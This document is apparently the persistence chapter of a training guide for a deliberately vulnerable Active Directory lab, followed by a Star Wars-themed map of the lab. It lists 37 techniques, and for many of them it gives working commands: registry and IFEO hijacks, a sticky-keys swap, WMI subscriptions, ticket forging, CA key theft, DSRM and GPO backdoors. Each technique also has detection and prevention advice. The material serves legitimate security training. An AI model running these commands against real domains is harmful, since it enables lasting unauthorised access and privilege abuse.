# 06 — Persistence (PER-001..037)

Persistence = "stay after credentials change, after reboot, after the IR team thinking they've cleaned up." EMPIRE has every common Windows + AD persistence primitive wired up — the lab is for *practicing detection* as much as offense.

---

### Persistence Vectors Mapping

```mermaid
graph LR
    classDef user fill:#1d2b38,stroke:#00d2ff,stroke-width:2px,color:#fff;
    classDef group fill:#3a1d38,stroke:#ff00d2,stroke-width:2px,color:#fff;
    classDef object fill:#333333,stroke:#aaaaaa,stroke-width:2px,color:#fff;

    Steve[steve.rogers]:::user -->|GenericAll| AdminSD[AdminSDHolder]:::object
    AdminSD -.->|SDProp / FullControl| DA[Domain Admins]:::group
```

---

### PER-001 — Registry Run Keys
**What it is:** `HKLM\Software\Microsoft\Windows\CurrentVersion\Run` (or `HKCU`) → executable runs on every logon.
**Tools:** `reg add`, `Set-ItemProperty`.
**Steps:**
```cmd
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /t REG_SZ /d "C:\Temp\b.exe"
```
**Detection:** Sysmon `13` registry-set in Run keys; AutoRuns scan.
**Prevention:** AppLocker; constrained language mode; user can't write HKLM Run.

---

### PER-002 — IFEO Debugger
**What it is:** `Image File Execution Options\<exe>\Debugger=C:\Temp\b.exe` — every time `<exe>` runs, `b.exe` runs in its place with `<exe>` as arg.
**Tools:** `reg add`.
**Steps:**
```cmd
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /t REG_SZ /d "cmd.exe"
```
**Detection:** Sysmon `13` writes under IFEO.
**Prevention:** restrict HKLM write; monitor IFEO writes.

---

### PER-003 — Sticky Keys / Utilman Hijack
**What it is:** replace `sethc.exe`/`utilman.exe` with `cmd.exe` → from the lock screen, press shift 5× / Win+U → SYSTEM cmd.
**Tools:** `takeown`/`icacls`/`copy`.
**Steps:**
```cmd
takeown /f C:\Windows\System32\sethc.exe
icacls C:\Windows\System32\sethc.exe /grant Administrators:F
copy /y C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
```
**Detection:** file-integrity-monitoring on `sethc.exe`/`utilman.exe`; Sysmon `11`.
**Prevention:** FIM; Credential Guard; lock-screen restriction GPO.

---

### PER-004 — Service Install
**What it is:** `sc create` your service for boot-time SYSTEM exec.
**Detection / Prevention:** PE-008.

---

### PER-005 — Scheduled Task
**What it is:** `schtasks /create /sc onstart /ru SYSTEM` → SYSTEM at boot.
**Detection:** Event `4698`.
**Prevention:** monitor task creation; require admin to create tasks running as SYSTEM.

---

### PER-006 — WMI Event Subscription
**What it is:** `__EventFilter` + `CommandLineEventConsumer` + `__FilterToConsumerBinding` → fires on a WQL condition (e.g. every 60s) → SYSTEM. Fileless.
**Tools:** `wmic`, `PowerSploit Install-EventSubscription`.
**Steps:**
```powershell
$f = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{Name='evil';EventNameSpace='root\cimv2';QueryLanguage='WQL';Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"}
$c = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{Name='evil';CommandLineTemplate='cmd.exe /c C:\Temp\b.exe'}
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}
```
**Detection:** Event `5861` WMI permanent subscription created.
**Prevention:** alert on every `5861`; baseline subscriptions; remove unknown ones.

---

### PER-007 — Netsh Helper DLL
**What it is:** `netsh add helper evil.dll` — DLL loaded each time `netsh` runs.
**Tools:** custom DLL.
**Detection:** Sysmon `13` `HKLM\Software\Microsoft\Netsh\<name>`.
**Prevention:** monitor netsh helpers; block writes to that key.

---

### PER-008 — COM Hijacking (TreatAs / ProgID)
**What it is:** HKCU COM keys take precedence over HKLM. Redirect a common CLSID → your DLL → every COM-using app loads it.
**Tools:** `Invoke-ATTACKAPI`, custom DLL.
**Steps:**
```reg
[HKCU\Software\Classes\CLSID\{0E5AAE11-A475-4C5B-AB00-C66DE400274E}\InprocServer32]
@="C:\\Temp\\evil.dll"
```
**Detection:** Sysmon `7` non-MS DLL loaded into common processes; HKCU CLSID writes.
**Prevention:** enable "Always check the registry for the latest version of a COM object" off; AppLocker DLL rules.

---

### PER-009 — Authentication Package (mimilib)
**What it is:** see CRED-038 + PER-024.

---

### PER-010 — Time Providers (W32Time)
**What it is:** `HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\<x>` registers a DLL loaded by the W32Time service (SYSTEM).
**Detection:** Sysmon `13` on those subkeys.
**Prevention:** monitor; FIM on `w32time.dll` DLL siblings.

---

### PER-011 — BootExecute
**What it is:** `HKLM\System\CurrentControlSet\Control\Session Manager\BootExecute` runs before everything else.
**Detection:** registry monitoring.
**Prevention:** FIM on that key.

---

### PER-012 — AppInit_DLLs
**What it is:** `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows\AppInit_DLLs` — DLLs loaded into every GUI process. Mostly disabled on modern Windows when secure boot is on.
**Detection:** monitor `LoadAppInit_DLLs` / `RequireSignedAppInit_DLLs` registry.
**Prevention:** `LoadAppInit_DLLs=0`; secure boot.

---

### PER-013 — Accessibility Tools
See PER-003 — same idea, all accessibility tools (Magnifier, OnScreenKeyboard, NarratorEC).

---

### PER-014 — RID Hijacking
See CRED-043.

---

### PER-015 — AdminSDHolder ACL injection
**What it is:** add ACE to `CN=AdminSDHolder,CN=System,DC=empire,DC=local`. SDProp re-applies the AdminSDHolder ACL every 60 minutes to every protected object (Domain Admins, Enterprise Admins, etc.). Self-healing backdoor — even if removed, returns within the hour.
**Why it works here:** GenericAll injected for `steve.rogers` in EMPIRE.
**Tools:** PowerView `Add-DomainObjectAcl -TargetIdentity AdminSDHolder -PrincipalIdentity steve.rogers -Rights All`.
**Steps:**
```powershell
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=empire,DC=local' \
   -PrincipalIdentity steve.rogers -Rights All
```
**Detection:** Event `5136` on AdminSDHolder; MDI native alert.
**Prevention:** alert on any change to AdminSDHolder; tier-0 isolation; PIM.

---

### PER-016 — SID History Injection
**What it is:** set `sIDHistory` on an attacker account to include privileged SIDs (Domain Admins 512, Enterprise Admins 519). Kerberos PAC carries them → effective admin.
**Tools:** mimikatz `sid::patch` + `sid::add`, DCShadow.
**Steps:**
```powershell
.\mimikatz.exe "sid::patch" "sid::add /sam:loki /new:S-1-5-21-EMPIRE-519"
```
**Detection:** MDI "SID-History suspicious activity."
**Prevention:** Quarantine attribute; PowerShell `Get-ADUser -Filter * -Properties sIDHistory | ?{$_.sIDHistory}` audit; SIDHistory should be empty in modern domains.

---

### PER-017 — DCShadow Persistent
See CRED-015.

---

### PER-018 — Golden Ticket
**What it is:** forge a TGT with the krbtgt NT hash. Lasts until krbtgt is reset *twice*.
**Why it works here:** krbtgt set deterministically to `KrbtgtEmpire2024!`.
**Tools:** `mimikatz kerberos::golden`, `impacket-ticketer`.
**Steps:**
```powershell
.\mimikatz.exe "kerberos::golden /domain:empire.local /sid:S-1-5-21-... /user:Administrator /krbtgt:HASH /ptt"
```
```bash
impacket-ticketer -nthash KRBTGT_HASH -domain-sid S-1-5-21-... -domain empire.local Administrator
```
**Detection:** Event `4769` TGS with no preceding `4768` (TGT issued); abnormal account-creation time in PAC; MDI "Suspected Golden Ticket usage."
**Prevention:** **rotate krbtgt twice** with the official script after compromise; tier-0 hygiene.

---

### PER-019 — Silver Ticket
**What it is:** forge a TGS for a single service using that service account's NT hash. No DC interaction = no DC log.
**Tools:** `mimikatz`, `ticketer.py`.
**Steps:**
```bash
impacket-ticketer -nthash HASH -domain empire.local -spn cifs/scarif.empire.local -domain-sid S-1-5-21-... Administrator
```
**Detection:** Event `4624` Logon Type 3 to service with mismatched PAC; service-side ticket inspection.
**Prevention:** AES-only; service-account password rotation; PAC validation.

---

### PER-020 — Skeleton Key
**What it is:** mimikatz `misc::skeleton` patches LSASS on DC → every account accepts a universal password (`mimikatz`) in addition to its real one.
**Detection:** mimikatz signature; LSASS integrity check; reboot kills it.
**Prevention:** Credential Guard; LSA Protection; reboot DCs regularly.

---

### PER-021 — Diamond Ticket
**What it is:** request a real TGT, decrypt with krbtgt hash, modify PAC (add group SIDs), re-encrypt. Looks legitimate because the 4768 *did* happen.
**Tools:** `Rubeus diamond`, `ticketer.py -extra-pac`.
**Steps:**
```powershell
.\Rubeus.exe diamond /tgtdeleg /krbkey:HASH /enctype:aes256 /ticketuser:Administrator /ticketuserid:500 /groups:512
```
**Detection:** harder than Golden because 4768 exists; abnormal PAC SIDs vs requesting user.
**Prevention:** PAC validation; krbtgt rotation.

---

### PER-022 — Sapphire Ticket
**What it is:** stealthiest variant — fetch real PAC via S4U2Self+U2U, inject into a forged TGT. Indistinguishable PAC.
**Tools:** `Rubeus diamond /sapphire`, `ticketer.py -impersonate`.
**Detection:** very hard — looks legitimate.
**Prevention:** krbtgt rotation; Protected Users.

---

### PER-023 — Golden Certificate
**What it is:** if you have DA/SYSTEM on the CA, export the CA cert + private key. Use it to mint client-auth certs for any user, forever. Survives krbtgt rotation, password resets, and most cleanup.
**Tools:** `Certipy ca -backup`, `ForgeCert.exe`.
**Steps:**
```bash
certipy ca -u Administrator -p 'EmpireLab2024!' -ca corp-CA-CA -backup
ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword '' --Subject 'CN=Administrator' --SubjectAltName 'Administrator@empire.local' --NewCertPath admin.pfx --NewCertPassword ''
certipy auth -pfx admin.pfx -dc-ip 10.10.0.10
```
**Detection:** unusual `certutil -backupkey`/CA backup; private key export events (Event `70` on CA).
**Prevention:** CA private key in HSM; tier-0 isolate CA; audit `4886`/`4887` for impersonation.

---

### PER-024 — Custom SSP (memssp/mimilib)
See CRED-038.

---

### PER-025 — DSRM Backdoor
**What it is:** set `DsrmAdminLogonBehavior=2` on a DC → the DSRM (Directory Services Restore Mode) account can be used for *network* logon with its hash. PtH directly to DC.
**Tools:** mimikatz `lsadump::sam`, registry edit.
**Steps:**
```cmd
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DsrmAdminLogonBehavior /t REG_DWORD /d 2
```
**Detection:** registry change to DsrmAdminLogonBehavior; Event `4624` Logon Type 3 with DSRM account.
**Prevention:** never enable network logon for DSRM; rotate DSRM passwords; FIM.

---

### PER-026 — Auth Package Persistence
See PER-009 / CRED-038.

---

### PER-027 — KeyCredentialLink Self-Shadow
**What it is:** GenericWrite on your own account → add a persistent device key to `msDS-KeyCredentialLink` → PKINIT auth forever even if password changes.
**Tools:** `pyWhisker`, `Certipy shadow`.
**Steps:**
```bash
certipy shadow auto -u peter.parker -p 'EmpireLab2024!' -account peter.parker
```
**Detection:** Event `5136` on `msDS-KeyCredentialLink` (self).
**Prevention:** restrict self-write on `msDS-KeyCredentialLink`; KB5014754 strict mapping.

---

### PER-028 — gMSA Backdoor
**What it is:** DA adds attacker to `PrincipalsAllowedToRetrieveManagedPassword` on a privileged gMSA → read at will, no log trail.
**Detection:** Event `5136` on the attribute.
**Prevention:** alert on gMSA delegation changes.

---

### PER-029 — RBCD Persistence on DC
**What it is:** DA sets `msDS-AllowedToActOnBehalfOfOtherIdentity` on a DC$ object for an attacker-owned machine → S4U → DA whenever.
**Detection:** Event `5136` on DC object.
**Prevention:** lock down RBCD writes on DCs.

---

### PER-030 — ADIDNS Time Bomb
**What it is:** pre-register DNS names you predict will exist later (`new-fileserver.empire.local`) → first-auth MITM.
**Detection:** ADIDNS write monitoring.
**Prevention:** restrict ADIDNS create.

---

### PER-031 — Schema Modification Backdoor
**What it is:** Schema Admins → add malicious attribute / class that triggers privilege side-effects. Extremely persistent; survives most cleanup.
**Detection:** schema container `5137`/`5141` events.
**Prevention:** empty Schema Admins; only populate during planned schema changes.

---

### PER-032 — Hidden Account via Confidentiality Flag
**What it is:** set object's security descriptor so it doesn't appear in normal enumeration (`ms-DS-Other-Settings` / DontShowInDirectory variants).
**Detection:** schema/object metadata audit.
**Prevention:** baseline AD object list; deviation = alert.

---

### PER-033 — AdminSDHolder ACL Injection
See PER-015.

---

### PER-034 — GPO Backdoor
**What it is:** edit a GPO linked to a broad OU → add startup script / scheduled task → code on every machine in OU.
**Tools:** `SharpGPOAbuse`, `New-GPOImmediateTask`.
**Steps:**
```powershell
.\SharpGPOAbuse.exe --AddComputerTask --TaskName Updater --Author 'NT AUTHORITY\SYSTEM' \
   --Command "cmd.exe" --Arguments "/c net user evil P@ss /add" --GPOName 'Default Domain Policy'
```
**Detection:** Event `5136` modifying GPO; SYSVOL writes.
**Prevention:** restrict GPO editors; alert on GPO change; tier-0 isolation.

---

### PER-035 — RODC Compromise Persistence
**What it is:** RODC admin can add accounts to `msDS-RevealOnDemandGroup` → their passwords get cached on RODC permanently.
**Detection:** Event `4742` on RODC object; `msDS-RevealedList` audit.
**Prevention:** RODC scope strictly limited; don't grant RODC admin loosely.

---

### PER-036 — MachineAccountQuota = 10 Backdoor
**What it is:** even without privileges, any domain user can create up to 10 computer accounts. They're attacker-controlled (you have the password). Use for RBCD, Shadow Creds, Silver Tickets.
**Detection:** Event `4741` (computer created) by non-admin.
**Prevention:** `MachineAccountQuota=0`.

---

### PER-037 — Service Account with TRUSTED_FOR_DELEGATION
**What it is:** DA creates a service account with unconstrained delegation as a long-term coercion landing pad.
**Detection:** Event `5136` adding `TRUSTED_FOR_DELEGATION` flag.
**Prevention:** disallow unconstrained delegation on accounts; alert on `userAccountControl` changes adding that bit.

---

Next: [`07-forest-compromise.md`](07-forest-compromise.md).

---

# The EMPIRE AD Lab: Star Wars Lore & Thematic Mapping

Welcome to the **EMPIRE AD Lab**, where the intricacies of Active Directory align with the galactic struggle between the Galactic Empire, the Rebel Alliance, and the shadow syndicates. This section provides a conceptual thematic mapping between the AD concepts you are attacking and the Star Wars universe.

## The Galactic Topology

The lab topology represents the political structure of the galaxy. Just as trust relationships govern AD, diplomatic and military alliances govern the galaxy.

```mermaid
graph TD
    classDef empire fill:#000000,stroke:#ff0000,stroke-width:2px,color:#fff;
    classDef rebel fill:#2b5c8f,stroke:#ff9900,stroke-width:2px,color:#fff;
    classDef trade fill:#4a4a4a,stroke:#aaaaaa,stroke-width:2px,color:#fff;
    classDef highlight fill:#440000,stroke:#ff0000,stroke-width:3px,color:#fff;

    subgraph The Galactic Empire (empire.local)
        Coruscant["Coruscant (Root DC)<br/>coruscant.empire.local"]:::empire
        DeathStar["The Death Star (Child DC)<br/>deathstar.eu.empire.local"]:::highlight
        Scarif["Scarif Citadel (File Server)<br/>scarif.empire.local"]:::empire
        Kamino["Kamino Cloning Facility (SQL)<br/>kamino.empire.local"]:::empire
        Endor["Endor Shield Generator (CA)<br/>endor.empire.local"]:::empire
        Mandalore["Mandalore Mercenary Base (Linux)<br/>mandalore.empire.local"]:::empire
        Coruscant -- "Imperial Command" --> DeathStar
        Coruscant --- Scarif
        Coruscant --- Kamino
        Coruscant --- Endor
        Coruscant --- Mandalore
    end

    subgraph The Rebel Alliance (rebel.local)
        Yavin4["Yavin 4 Base<br/>yavin4.rebel.local"]:::rebel
    end

    subgraph The Trade Federation (trade.corp)
        Neimoidia["Cato Neimoidia<br/>neimoidia.trade.corp"]:::trade
    end

    Coruscant <-->|Espionage / External Trust| Yavin4
    Coruscant <-->|Treaty / Forest Trust| Neimoidia
```

## Infrastructure Mapping

Understanding the infrastructure is key to successfully executing your attack paths. Here is how the technical components of the EMPIRE AD lab map to the Star Wars universe:

### 1. The Core Domains
* **`empire.local` (The Galactic Empire):** The central root domain. This is the seat of the Emperor and the Imperial Senate. Taking over this domain is equivalent to taking over Coruscant. It controls all the core infrastructure.
* **`eu.empire.local` (The Death Star):** A child domain of `empire.local`. While it reports to the root domain, it holds immense power. Escaping the child domain to compromise the root domain is the equivalent of using the Death Star plans to destroy the Empire.
* **`rebel.local` (The Rebel Alliance):** An external forest. It has an external trust with the Empire (perhaps through espionage or captured spies). Moving laterally across this trust requires finding a weak link in the Rebel defenses.
* **`trade.corp` (The Trade Federation):** A separate forest with a bidirectional forest trust. The Empire uses them for resources, but you can forge trust tickets (Inter-Realm TGTs) to cross this boundary.

### 2. High-Value Targets (Servers)
* **`coruscant.empire.local` (Coruscant Root DC):** The ultimate prize. Achieving Domain Admin here gives you the keys to the galaxy.
* **`endor.empire.local` (Endor Shield Generator / ADCS):** Active Directory Certificate Services. If you can compromise the CA (via ESC1, ESC8, etc.), you can forge certificates for any user in the Empire, effectively bringing down the deflector shields.
* **`scarif.empire.local` (Scarif Citadel):** This file server hosts critical SMB shares. It is the repository of the Death Star plans. Look for exposed passwords in scripts or configuration files left by careless Imperial engineers.
* **`kamino.empire.local` (Kamino Facility):** The SQL Server. SQL injection or xp_cmdshell here can lead to a foothold. It represents the cloning facilities—a hidden source of power.
* **`mandalore.empire.local` (Mandalore Base):** The Linux-in-AD member. Contains local privilege escalations and cross-OS pivot opportunities. Represents the mercenary faction employed by the Empire.

### 3. Attack Paths and Tactics
* **Initial Access (The Smuggler's Route):** Finding an exposed SMB share or exploiting an LLMNR poisoning vulnerability (Responder) is like slipping past the Imperial blockade.
* **Kerberoasting (Bounty Hunting):** Requesting TGS tickets for service accounts and cracking them offline is like putting a bounty on a high-value target and cracking their encryption.
* **DCSync (The Force):** Using `secretsdump` to pull the `krbtgt` hash directly from the Domain Controller. It's an invisible, powerful attack that bypasses normal defenses.
* **Golden Ticket (Order 66):** Once you have the `krbtgt` hash, you can forge a TGT for any user, granting you infinite access. It is the ultimate executive order, overriding all security protocols.
* **Trust Abuse (Diplomatic Immunity):** Forging a trust ticket to cross from the Child Domain to the Root Domain.

## The Hacker's Code (Sith vs Jedi)
As you navigate the lab, remember that the tools you use define your path. Will you use noisy, aggressive tools (The Dark Side) that trigger every alarm, or will you use stealthy, precise tradecraft (The Light Side) to move undetected?

* **The Dark Side (Noisy):** Running `BloodHound` with all collection methods, spraying passwords across the entire domain, and dropping standard Mimikatz binaries to disk. It is powerful and fast, but leaves a massive trail.
* **The Light Side (Stealthy):** Targeted LDAP queries, memory-only execution via Covenant or Cobalt Strike, and careful evasion of logging (AMSI bypasses, ETW patching).

## Flag Locations (Holocrons)
Hidden throughout the EMPIRE AD lab are flags (Holocrons) that prove your mastery over the environment. Look for `FLAG-*.txt` files on desktops, hidden SMB shares, and within the SQL databases. 

**Remember:** 
* "Your focus determines your reality." - Qui-Gon Jinn. Focus on the attack paths mapped out in `PLAN.md`.
* "I find your lack of faith disturbing." - Darth Vader. If an exploit fails, check your syntax, your targeting, and the underlying misconfiguration. The lab is intentionally vulnerable.

May the Force be with you as you conquer the EMPIRE AD!
